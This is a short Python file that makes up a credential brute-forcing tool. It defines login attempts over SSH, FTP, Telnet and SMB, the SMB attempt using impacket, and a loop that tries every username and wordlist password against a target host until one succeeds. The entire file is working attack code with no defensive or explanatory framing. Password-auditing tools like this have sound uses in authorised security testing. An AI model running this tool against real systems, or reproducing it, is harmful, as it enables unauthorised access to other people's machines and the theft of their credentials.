import socket
import ftplib
import paramiko

try:
    from impacket.smbconnection import SMBConnection
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False

def try_ssh(host, port, user, pw, timeout=5):
    c = paramiko.SSHClient()
    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        c.connect(
            hostname=host, port=port, username=user, password=pw,
            timeout=timeout, banner_timeout=timeout, auth_timeout=timeout,
            allow_agent=False, look_for_keys=False,
        )
        c.close()
        return True
    except Exception:
        return False

def try_ftp(host, port, user, pw, timeout=5):
    try:
        f = ftplib.FTP()
        f.connect(host, port, timeout=timeout)
        f.login(user, pw)
        f.quit()
        return True
    except Exception:
        return False

def try_telnet(host, port, user, pw, timeout=5):
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.settimeout(timeout)
        data = s.recv(4096)
        low = data.lower()
        if b"login" in low or b"user" in low or b"username" in low:
            s.sendall(user.encode() + b"\n")
            data = s.recv(4096)
            if b"password" in data.lower():
                s.sendall(pw.encode() + b"\n")
                data = s.recv(4096)
                low = data.lower()
                if b"incorrect" not in low and b"failed" not in low and b"invalid" not in low:
                    s.close()
                    return True
        s.close()
    except Exception:
        pass
    return False

def try_smb(host, user, pw, timeout=5):
    if not HAS_IMPACKET:
        return False
    try:
        c = SMBConnection("", host, sess_port=445, timeout=timeout)
        c.login(user, pw)
        c.close()
        return True
    except Exception:
        return False

DISPATCH = {22: try_ssh, 21: try_ftp, 23: try_telnet, 445: try_smb}

def brute(host, port, users, wordlist, timeout=5):
    fn = DISPATCH.get(port)
    if not fn:
        return None
    for u in users:
        for p in wordlist:
            p = p.strip()
            if not p:
                continue
            if port == 445:
                ok = fn(host, u, p, timeout)
            else:
                ok = fn(host, port, u, p, timeout)
            if ok:
                return (u, p)
    return None
